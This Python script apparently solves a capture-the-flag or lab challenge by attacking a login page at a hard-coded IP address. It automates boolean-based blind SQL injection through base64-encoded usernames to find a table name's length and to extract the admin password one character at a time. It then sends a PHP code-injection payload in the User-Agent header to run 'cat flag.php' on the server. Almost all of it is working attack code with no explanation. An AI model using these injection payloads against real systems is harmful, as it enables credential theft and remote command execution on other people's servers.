#!/usr/bin/env python

import requests
import string

post = requests.post
get = requests.get
success_pattern = "Hello, test"

def login(uri, user, passwd, headers = None):
    post_data = {"username": user, "password": passwd}
    r = post(uri, data = post_data, headers = headers)
    return r


def guess_len(m):
    for i in range(m):
        table_name = "information_schema.tables"
        len_query = "LENGTH((SeLeCT table_name FROM {} WHERE table_schema != 'mysql' AND table_schema != 'information_schema' LIMIT 0,1))".format(table_name)
        payload = "AND {}={}#".format(len_query, i+1)
        #payload = "AND (SELECT 'aaaa' FROM {})='aaaa'#".format(table_name)
        query = "test' " + payload
        user = query.encode("base64").replace("\n", "")
        if "Hello, test" in login("http://140.113.194.85:49165/loginsystem/login.php", user, "test".encode("base64")).text:
            print "Length of password: {}".format(i+1)
            return i+1

def guess_char(l):
    passwd = ""
    for index in range(l):
        for i in range(0x20, 0x7f):
            row = 0 
            #table_name = "information_schema.tables"
            #guess_query = "(SeLeCT table_name FROM {} WHERE table_schema != 'mysql' AND table_schema != 'information_schema' LIMIT {},1)".format(table_name, row)
            table_name = "user"
            guess_query = "(SeLeCT password FROM {} WHERE username='admin' LIMIT {},1)".format(table_name, row)
            payload = "AND ASCII(SUBSTR({}, {}, 1)) = {}#".format(guess_query, index + 1, i)
            query = "test' " + payload
            user = query.encode("base64").replace("\n", "")
            if success_pattern in login("http://140.113.194.85:49165/loginsystem/login.php", user, "test".encode("base64")).text:
                print chr(i),
                passwd += chr(i)
                break

    return passwd

def user_agent():
    headers = {'user-agent': '<?php system("cat flag.php");?>'}
    r = login("http://140.113.194.85:49165/loginsystem/login.php", \
        "admin".encode("base64"), \
        "gogopowerranger".encode("base64"), \
        headers = headers)
    print r.text
            
#l = guess_len(100)
#print guess_char(32)
user_agent()

